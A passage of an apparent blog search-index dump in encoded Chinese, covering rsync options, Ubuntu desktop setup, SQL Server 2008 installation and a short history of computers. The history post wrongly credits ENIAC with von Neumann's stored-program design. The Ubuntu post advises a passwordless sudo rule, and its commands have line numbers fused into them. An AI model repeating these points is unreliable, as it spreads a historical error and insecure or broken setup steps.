rsync&#x662F;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x547D;&#x4EE4;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x8272;&#x9009;&#x9879;&#xFF0C;&#x6211;&#x4EEC;&#x4E0B;&#x9762;&#x5C31;&#x5BF9;&#x5B83;&#x7684;&#x9009;&#x9879;&#x4E00;&#x4E00;&#x8FDB;&#x884C;&#x5206;&#x6790;&#x8BF4;&#x660E;&#x3002; &#x4E00;&#x3001;rsync&#x547D;&#x4EE4; &#x57FA;&#x672C;&#x683C;&#x5F0F;&#xFF1A; rsync [option] &#x539F;&#x59CB;&#x4F4D;&#x7F6E; &#x76EE;&#x6807;&#x4F4D;&#x7F6E; &#x5E38;&#x7528;&#x9009;&#x9879;&#xFF1A; -a &#x5F52;&#x6863;&#x6A21;&#x5F0F;&#xFF0C;&#x9012;&#x5F52;&#x5E76;&#x4FDD;&#x7559;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;-rlptgoD -v &#x663E;&#x793A;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x8BE6;&#x7EC6;(verbose)&#x4FE1;&#x606F; -z &#x5728;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x65F6;&#x8FDB;&#x884C;&#x538B;&#x7F29;(compress) -H &#x4FDD;&#x7559;&#x786C;&#x8FDE;&#x63A5;&#x6587;&#x4EF6; -A &#x4FDD;&#x7559;ACL&#x5C5E;&#x6027; --delete &#x5220;&#x9664;&#x76EE;&#x6807;&#x4F4D;&#x7F6E;&#x6709;&#x800C;&#x539F;&#x59CB;&#x4F4D;&#x7F6E;&#x6CA1;&#x6709;&#x7684;&#x6587;&#x4EF6; -r &#x9012;&#x5F52;&#x6A21;&#x5F0F;&#xFF0C;&#x5305;&#x542B;&#x76EE;&#x5F55;&#x53CA;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x6240;&#x6709;&#x6587;&#x4EF6; -l &#x5BF9;&#x4E8E;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x4ECD;&#x7136;&#x590D;&#x5236;&#x4E3A;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6; -p &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x6807;&#x8BB0; -t &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x95F4;&#x6807;&#x8BB0; -g &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x7EC4;&#x6807;&#x8BB0;&#xFF08;&#x4EC5;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x4F7F;&#x7528; -o &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x5C5E;&#x4E3B;&#x6807;&#x8BB0;&#xFF08;&#x4EC5;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x4F7F;&#x7528; -D &#x4FDD;&#x7559;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x53CA;&#x5176;&#x4ED6;&#x7279;&#x6B8A;&#x6587;&#x4EF6; &#x914D;&#x7F6E;rsync&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;srync&#x6258;&#x7BA1;xinetd document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"CTF","slug":"CTF","permalink":"https://marnm.github.io/tags/CTF/"},{"name":"信息安全","slug":"信息安全","permalink":"https://marnm.github.io/tags/信息安全/"},{"name":"网络空间安全","slug":"网络空间安全","permalink":"https://marnm.github.io/tags/网络空间安全/"},{"name":"Python","slug":"Python","permalink":"https://marnm.github.io/tags/Python/"}]},{"title":"Ubuntu Desktop优化与配置","date":"2021-11-10T07:23:44.000Z","path":"/posts/e76ba468/","text":"vmtools&#x5982;&#x679C;&#x5728;VMware&#x865A;&#x62DF;&#x673A;&#x91CC;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;open-vm-tools&#xFF0C;&#x8FD9;&#x662F;&#x539F;&#x6765;&#x7684;vmtools&#x901A;&#x8FC7;&#x5F00;&#x6E90;&#x51FA;&#x6765;&#x7684;&#x7248;&#x672C;&#x800C;&#x5DF2; 1sudo apt-get install open-vm-tools open-vm-tools-desktop gnome-teawk-tool&#x5B89;&#x88C5;gnome-tweak&#x4FEE;&#x6539;DPI&#x3001;&#x4E3B;&#x9898;&#x3001;&#x56FE;&#x6807; 1sudo apt-get install gnome-tweak-tool &#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;&#x63D2;&#x4EF6;&#x5730;&#x5740;URL&#x3002;&#x8981;&#x4FEE;&#x6539;gnome-shell&#xFF0C;&#x8BB0;&#x5F97;&#x5148;&#x5B89;&#x88C5;User Themse&#x63D2;&#x4EF6; Ubuntu &#x7684;&#x914D;&#x7F6E;&#x4FEE;&#x6539;&#x955C;&#x50CF;&#x6E90;/etc/apt/source.list 12sudo apt-get updatesudo apt-get upgrade &#x8FDB;&#x5165;&#x8BBE;&#x7F6E;&#x9762;&#x677F;-&#x66F4;&#x65B0;&#x8F93;&#x5165;&#x6CD5;&#x914D;&#x7F6E; &#x7F8E;&#x5316;sudo apt install gnome-tweaks &#x6216;gnome-tweak-tool&#x6D4F;&#x89C8;&#x5668;&#x63D2;&#x4EF6;chrome-gnome-shellUser Themes&#xFF0C;Dash to Dockgnome-shell-extensions&#x5B89;&#x88C5;&#x4E3B;&#x9898; shell: .local/share/theme&#x76EE;&#x5F55;&#x4E0B;&#x56FE;&#x6807; .local/share/icons&#x5B57;&#x4F53; .local/share/fonts &#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#xFF0C;&#x8FDB;&#x5165;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x5373;&#x53EF;Google Chrome&#x3001;&#x641C;&#x72D7;&#x8F93;&#x5165;&#x6CD5;&#x3001;WPS WPS&#x82E5;&#x6709;&#x5B57;&#x4F53;&#x7F3A;&#x5931;&#x95EE;&#x9898;&#x4E0B;&#x8F7D;&#x7F3A;&#x5931;&#x5B57;&#x4F53;&#x6587;&#x4EF6;&#x5305;&#xFF0C;&#x89E3;&#x538B;&#x5230;sudo mv * /usr/share/fonts&#x751F;&#x6210;&#x5B57;&#x4F53;&#x7D22;&#x5F15;&#x4FE1;&#x606F;sudo mkfontscalesudo mkfontdir&#x66F4;&#x65B0;&#x5B57;&#x4F53;&#x7F13;&#x5B58;sudo fc-cache &#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x5DE5;&#x5177;git&#x3001;curl&#x3001;net-tools&#x3001;vim&#x3001;emacs&#x3001;tree&#x3001;nmap sudo&#x514D;&#x5BC6;&#x7801;(abc&#x662F;&#x7528;&#x6237;&#x540D;&#xFF09; 12sudo visudoabc ALL=(ALL) NOPASSWD: ALL &#x5F00;&#x53D1;&#x73AF;&#x5883;JAVAopen-jdk:apt install openjdk-8-jdkapt install openjdk-8-source oracle-jdk&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;JDKsudo tar -zxvf jdk-8-xxx.tar.gz -C /usr/&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E; 123456cat &gt;&gt; ~/.bashrc &lt;&lt;- &quot;EOF&quot;export JAVA_HOME=/usr/jdk-xxxx...export PATH=$JAVA_HOME/bin/$PATHEOFsource ~/.bashrc Qv2ray&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x914D;&#x7F6E;&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x4F17;&#x6240;&#x5468;&#x77E5;&#x7684;&#x653F;&#x7B56;&#x539F;&#x56E0;&#xFF0C;Qv2ray &#x672C;&#x8EAB;&#x5E76; &#x4E0D;&#x5305;&#x542B; V2Ray &#x6838;&#x5FC3;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E9B;&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x6765;&#x81EA;&#x4E00;&#x4E2A;&#x53EB;&#x505A; v2ray-core &#x7684;&#x9879;&#x76EE;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x3002;&#x9879;&#x76EE;&#x5730;&#x5740;https://github.com/v2fly/v2ray-core/releases&#x5C06;&#x89E3;&#x538B;&#x51FA;&#x6765;&#x7684;&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x653E;&#x5230;.config/qv2ray/vcore&#x4E0B;v2ray | v2ctl | geoip.dat | geosite.dat &#xFF08;&#x8FD9;&#x51E0;&#x4E2A;&#x5FC5;&#x987B;&#xFF09; &#x51FA;&#x73B0;&#x5F88;&#x591A;&#x547D;&#x4EE4;&#x4E22;&#x5931;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x547D;&#x4EE4;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x5728;/etc/profile&#x6216;&#x8005;.bashrc&#x6DFB;&#x52A0; 123export PATH=&quot;$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;source profile source .bashrc &#x7ED9;snap&#x8BBE;&#x7F6E;&#x4EE3;&#x7406;&#xFF0C;&#x6CE8;&#x610F;&#x5730;&#x5740;&#x4E0D;&#x80FD;&#x5E26;https&#x542F;&#x52A8;vpn&#x540E; 12[user@lc]_ sudo snap set system proxy.http=&quot;http://&lt;proxy_addr&gt;:&lt;proxy_port&gt;&quot; [user@lc]_ sudo snap set system proxy.https=&quot;http://&lt;proxy_addr&gt;:&lt;proxy_port&gt;&quot; &#x4F8B;&#x5982; 12sudo snap set system proxy.http=&quot;http://127.0.0.1:8889&quot;sudo snap set system proxy.https=&quot;http:127.0.0.1:8889&quot; &#x5B89;&#x88C5;Pycharmsudo tar -zxvf xxx.tar.gz -C /opt/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"}]},{"title":"SQL Server 2008安装配置","date":"2021-03-25T11:08:40.000Z","path":"/posts/c45f2736/","text":"&#x7CFB;&#x7EDF;&#x8981;&#x6C42;&#x5B98;&#x7F51;&#x7684;&#x6700;&#x4F4E;&#x8981;&#x6C42; SQL Server 2008 System Requirements &#x5B89;&#x88C5;&#x8FC7;&#x7A0B; Install Check Enter Key Accept License Click Install Next Step Default Select All Default Server Config &#x8FD9;&#x91CC;&#x53EF;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3010;Windows&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x6A21;&#x5F0F;&#x3011;&#xFF0C;&#x7136;&#x540E;&#x3010;&#x6DFB;&#x52A0;&#x5F53;&#x524D;&#x7528;&#x6237;&#x3011;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#xFF1A; SQL Server Engine Config Analysis Server Configure &#x540E;&#x9762;&#x7684;&#x57FA;&#x672C;&#x5168;&#x90E8;&#x9ED8;&#x8BA4;&#x3010;&#x4E0B;&#x4E00;&#x6B65;&#x3011;&#xFF0C;&#x7B49;&#x5F85;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#xFF1A; Install Installed &#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#x6253;&#x5F00;&#x6570;&#x636E;&#x5E93;&#x5C5E;&#x6027;&#xFF1A; Security Enable Connection Enable TCP/IP &#x5982;&#x679C;Windows&#x542F;&#x7528;&#x4E86;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x8BF7;&#x5141;&#x8BB8;1433&#x7AEF;&#x53E3;&#x51FA;&#x5165; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"SQL Server","slug":"SQL-Server","permalink":"https://marnm.github.io/tags/SQL-Server/"}]},{"title":"计算机概述","date":"2020-10-24T13:39:04.000Z","path":"/posts/217dc297/","text":"&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0; &#x4ECA;&#x5929;1024&#xFF0C;&#x6D45;&#x8C08;&#x4EE5;&#x4E0B;&#x8BA1;&#x7B97;&#x673A;&#x5386;&#x53F2;&#x2026;. &#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;&#x81EA;&#x53E4;&#x4EE5;&#x6765;&#x4EBA;&#x7C7B;&#x5C31;&#x5728;&#x4E0D;&#x65AD;&#x5730;&#x53D1;&#x660E;&#x548C;&#x6539;&#x8FDB;&#x8BA1;&#x7B97;&#x5DE5;&#x5177;&#xFF0C;&#x4ECE;&#x7ED3;&#x7EF3;&#x8BA1;&#x6570;&#x5230;&#x7B97;&#x76D8;&#xFF0C;&#x8BA1;&#x7B97;&#x5C3A;&#xFF0C;&#x624B;&#x6447;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x76F4;&#x5230;1946&#x5E74;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x8BDE;&#x751F;&#xFF0C;&#x867D;&#x7136;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x81F3;&#x4ECA;&#x867D;&#x7136;&#x53EA;&#x6709;&#x77ED;&#x77ED;&#x7684;&#x534A;&#x4E2A;&#x591A;&#x4E16;&#x7EAA;&#xFF0C;&#x4F46;&#x53D6;&#x5F97;&#x4E86;&#x60CA;&#x4EBA;&#x7684;&#x53D1;&#x5C55;&#x5417;&#xFF0C;&#x5DF2;&#x7ECF;&#x7ECF;&#x5386;&#x4E86;&#x4E94;&#x4EE3;&#x7684;&#x53D8;&#x9769;&#x3002;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x53D1;&#x5C55;&#x548C;&#x7535;&#x5B50;&#x6280;&#x672F;&#x7684;&#x53D1;&#x5C55;&#x5BC6;&#x5207;&#x76F8;&#x5173;&#xFF0C;&#x6545;&#x6BCF;&#x6B21;&#x7535;&#x5B50;&#x6280;&#x672F;&#x6709;&#x7A81;&#x7834;&#x6027;&#x7684;&#x53D1;&#x5C55;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x4E00;&#x6B21;&#x91CD;&#x5927;&#x53D8;&#x9769;&#x3002;&#x6240;&#x4EE5;&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x53F2;&#x4E2D;&#x7684; &#x2018;&#x2019;&#x4EE3;&#x2018;&#x2019; &#x901A;&#x5E38;&#x4EE5;&#x5176;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x4E3B;&#x8981;&#x5668;&#x4EF6;&#x6765;&#x5212;&#x5206;&#x7684;&#xFF08;&#x7535;&#x5B50;&#x7BA1;&#xFF0C;&#x6676;&#x4F53;&#x7BA1;&#xFF0C;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF0C;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF0C;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF09;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5404;&#x4E2A;&#x9636;&#x6BB5;&#x6240;&#x914D;&#x7F6E;&#x7684;&#x8F6F;&#x4EF6;&#x548C;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x4E5F;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x7279;&#x70B9;&#xFF0C;&#x6210;&#x4E3A;&#x5212;&#x5206; &#x201C;&#x4EE3;&#x201D; &#x7684;&#x6807;&#x5FD7;&#x4E4B;&#x4E00;&#x3002;1&#xFF1A;&#x7B2C;&#x4E00;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1946-1957&#xFF09; &#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x65E9;&#x671F;&#x7814;&#x7A76;&#x662F;&#x4ECE;20&#x4E16;&#x7EAA;30&#x5E74;&#x4EE3;&#x672B;&#x5F00;&#x59CB;&#x7684;&#x3002;&#x82F1;&#x56FD;&#x6570;&#x5B66;&#x5BB6; &#x827E;&#x4F26;&#x25AA;&#x56FE;&#x7075; &#x5728;&#x4E00;&#x7BC7;&#x8BBA;&#x6587;&#x4E2D;&#x63CF;&#x8FF0;&#x4E86;&#x901A;&#x7528;&#x8BA1;&#x7B97;&#x673A;&#x5E94;&#x5177;&#x6709;&#x7684;&#x5168;&#x90E8;&#x529F;&#x80FD;&#x53CA;&#x5176;&#x5C40;&#x9650;&#x6027;&#xFF0C;&#x8FD9;&#x79CD;&#x673A;&#x5668;&#x88AB;&#x6210;&#x4E3A;&#x56FE;&#x7075;&#x673A;&#x3002;&#xFF08;&#x4E16;&#x754C;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A; ENIAC &#x5728;1946&#x5E74;&#x8BDE;&#x751F;&#x4E8E;&#x7F8E;&#x56FD;&#x5BBE;&#x5915;&#x6CD5;&#x5C3C;&#x4E9A;&#x5927;&#x5B66;&#xFF0C;&#x4F46;&#x5B66;&#x672F;&#x754C;&#x516C;&#x8BA4;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7406;&#x8BBA;&#x548C;&#x6A21;&#x578B;&#x662F;&#x7531;&#x82F1;&#x56FD;&#x6570;&#x5B66;&#x5BB6;&#x56FE;&#x7075;&#x5728;&#x6B64;10&#x5E74;&#x524D;&#x53D1;&#x8868;&#x7684;&#x4E00;&#x7BC7;&#x8BBA;&#x6587;&#x300A;&#x8BBA;&#x53EF;&#x8BA1;&#x7B97;&#x6570;&#x53CA;&#x5176;&#x5728;&#x5224;&#x5B9A;&#x95EE;&#x9898;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x300B;&#x4E2D;&#x5960;&#x5B9A;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x7F8E;&#x56FD;&#x8BA1;&#x7B97;&#x673A;&#x534F;&#x4F1A;&#x5728;1966&#x5E74;&#x7EAA;&#x5FF5;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x8BDE;&#x751F;20&#x5468;&#x5E74;&#x65F6;&#xFF0C;&#x8BBE;&#x7ACB;&#x4E86;&#x8BA1;&#x7B97;&#x673A;&#x754C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5956;&#x9879; &#x201C;&#x56FE;&#x7075;&#x5956;&#x201D; &#xFF0C;&#x4EE5;&#x7EAA;&#x5FF5;&#x8FD9;&#x4F4D;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x7406;&#x8BBA;&#x7684;&#x5960;&#x57FA;&#x4EBA;&#xFF09; 1939&#x5E74;&#xFF0C;&#x7F8E;&#x56FD;&#x8863;&#x963F;&#x534E;&#x5DDE;&#x7ACB;&#x5927;&#x5B66;&#x7684;&#x7EA6;&#x7FF0;&#x25AA;&#x963F;&#x5854;&#x7EB3;&#x7D22;&#x592B;&#x6559;&#x6388;&#x548C;&#x4ED6;&#x7684;&#x7814;&#x7A76;&#x751F;&#x514B;&#x91CC;&#x798F;&#x5FB7;&#x25AA;&#x8D1D;&#x91CC;&#x4E00;&#x8D77;&#x5236;&#x4F5C;&#x4E86;&#x4E00;&#x53F0;&#x79F0;&#x4E3A;ABC&#x7684;&#x673A;&#x5668;&#xFF0C;&#x4F46;&#x5176;&#x4EC5;&#x80FD;&#x6C42;&#x89E3;&#x65B9;&#x7A0B;&#x5F0F;&#x7684;&#x4E13;&#x7528;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#xFF1B; 1944&#x5E74;&#xFF0C;&#x54C8;&#x4F5B;&#x5927;&#x5B66;&#x970D;&#x534E;&#x5FB7;&#x25AA;&#x827E;&#x80AF;&#x535A;&#x58EB;&#x548C;IBM&#x516C;&#x53F8;&#x7684;&#x5DE5;&#x7A0B;&#x5E08;&#x5C0F;&#x7EC4;&#x5408;&#x4F5C;&#xFF0C;&#x4EE5;100&#x4E07;&#x7F8E;&#x5143;&#x7814;&#x5236;&#x4E86;&#x4E00;&#x53F0;&#x79F0;&#x4E3A;Mark-I&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x5B83;&#x4F53;&#x79EF;&#x5927;&#xFF0C;&#x8FD0;&#x7B97;&#x901F;&#x5EA6;&#x4E5F;&#x6162;&#xFF0C;&#x4E14;&#x4EC5;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x7535;&#x5B50;&#x5F0F;&#x7684;&#xFF0C;&#x53E6;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x673A;&#x68B0;&#x5F0F;&#x7684;&#xFF1B; 1946&#x5E74;&#xFF0C;&#x5BBE;&#x5915;&#x6CD5;&#x5C3C;&#x4E9A;&#x5927;&#x5B66;&#x7684;&#x7EA6;&#x7FF0;&#x25AA;&#x83AB;&#x514B;&#x83B1;&#x548C;&#x4ED6;&#x7684;&#x7814;&#x7A76;&#x751F;&#x666E;&#x96F7;&#x65AF;&#x5E15;&#x25AA;&#x57C3;&#x514B;&#x7279;&#x4E00;&#x8D77;&#x7814;&#x5236;&#x4E86;ENIAC&#xFF08;&#x7535;&#x5B50;&#x6570;&#x5B57;&#x79EF;&#x5206;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x662F;&#x516C;&#x8BA4;&#x7684;&#x4E16;&#x754C;&#x4E0A;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x8BE5;&#x8BA1;&#x7B97;&#x673A;&#x91C7;&#x53D6;&#x4E86;&#x666E;&#x6797;&#x65AF;&#x987F;&#x5927;&#x5B66;&#x6570;&#x5B66;&#x6559;&#x6388; &#x51AF;&#x25AA;&#x4F0A;&#x8BFA;&#x66FC; &#x201C;&#x5B58;&#x50A8;&#x7A0B;&#x5E8F;&#x201D;&#x7684;&#x5EFA;&#x8BAE;&#xFF08;&#x628A;&#x8BA1;&#x7B97;&#x673A;&#x7A0B;&#x5E8F;&#x4E0E;&#x6570;&#x636E;&#x4E00;&#x8D77;&#x5B58;&#x50A8;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x8FD4;&#x56DE;&#x524D;&#x9762;&#x7684;&#x6307;&#x4EE4;&#x6216;&#x53CD;&#x590D;&#x6267;&#x884C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;ENIAC&#x5728;&#x64CD;&#x4F5C;&#x4E0A;&#x7684;&#x4E0D;&#x4FBF;&#xFF09;&#xFF1B; &#x4E00;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5171;&#x540C;&#x7279;&#x70B9;&#xFF1A;&#x903B;&#x8F91;&#x5668;&#x4EF6;&#x4F7F;&#x7528;&#x7535;&#x5B50;&#x7BA1;&#xFF1B;&#x7528;&#x7A7F;&#x5B54;&#x5361;&#x7247;&#x673A;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x548C;&#x6307;&#x4EE4;&#x7684;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#xFF1B;&#x7528;&#x78C1;&#x9F13;&#x6216;&#x78C1;&#x5E26;&#x4F5C;&#x4E3A;&#x5916;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x4F7F;&#x7528;&#x673A;&#x5668;&#x8BED;&#x8A00;&#x7F16;&#x7A0B;&#x3002; 2&#xFF1A;&#x7B2C;&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1958-1964&#xFF09; &#x5728;&#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x6676;&#x4F53;&#x7BA1;&#xFF0C;&#x4E0E;&#x4E00;&#x4EE3;&#x673A;&#x76F8;&#x6BD4;&#xFF0C;&#x5B83;&#x4F53;&#x79EF;&#x5C0F;&#xFF0C;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x80FD;&#x8017;&#x4F4E;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x9AD8;&#xFF1B; &#x9AD8;&#x7EA7;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x7684;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#xFF0C;&#x5C06;&#x8BA1;&#x7B97;&#x673A;&#x4ECE;&#x5C11;&#x6570;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#x624B;&#x4E2D;&#x89E3;&#x653E;&#x51FA;&#x6765;&#xFF0C;&#x63A8;&#x8FDB;&#x4E86;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x666E;&#x53CA;&#x4E0E;&#x5E94;&#x7528;&#xFF1B; &#x4E8C;&#x4EE3;&#x673A;&#x5668;&#x4E2D;&#x8F93;&#x5165;&#x3001;&#x8F93;&#x51FA;&#x8BBE;&#x5907;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;&#x65E0;&#x6CD5;&#x4E0E;&#x4E3B;&#x673A;&#x7684;&#x8BA1;&#x7B97;&#x901F;&#x5EA6;&#x76F8;&#x5339;&#x914D;&#x3002; &#x4E8C;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7279;&#x70B9;&#x4E3A;&#xFF1A;&#x7528;&#x6676;&#x4F53;&#x7BA1;&#x4EE3;&#x66FF;&#x7535;&#x5B50;&#x7BA1;&#xFF1B;&#x5185;&#x5B58;&#x50A8;&#x5668;&#x91C7;&#x7528;&#x4E86;&#x78C1;&#x5FC3;&#x4F53;&#xFF1B;&#x5F15;&#x5165;&#x4E86;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x6D6E;&#x70B9;&#x8FD0;&#x7B97;&#x786C;&#x4EF6;&#xFF1B;&#x5229;&#x7528; I/O &#x5904;&#x7406;&#x673A;&#x63D0;&#x9AD8;&#x4E86;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x80FD;&#x529B;&#xFF1B;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x914D;&#x7F6E;&#x4E86;&#x5B50;&#x7A0B;&#x5E8F;&#x5E93;&#x548C;&#x6279;&#x5904;&#x7406;&#x7BA1;&#x7406;&#x7A0B;&#x5E8F;&#x3002; 3&#xFF1A;&#x7B2C;&#x4E09;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1965-1971&#xFF09; 1958&#x5E74;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x95EE;&#x4E16;&#xFF08;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x5C31;&#x662F;&#x5C06;&#x5927;&#x91CF;&#x7684;&#x6676;&#x4F53;&#x7BA1;&#x548C;&#x7535;&#x5B50;&#x7EBF;&#x8DEF;&#x7EC4;&#x5408;&#x5728;&#x4E00;&#x5757;&#x7845;&#x6676;&#x7247;&#x4E0A;&#xFF0C;&#x6545;&#x79F0;&#x4E3A;&#x82AF;&#x7247;&#xFF09;&#x3002; 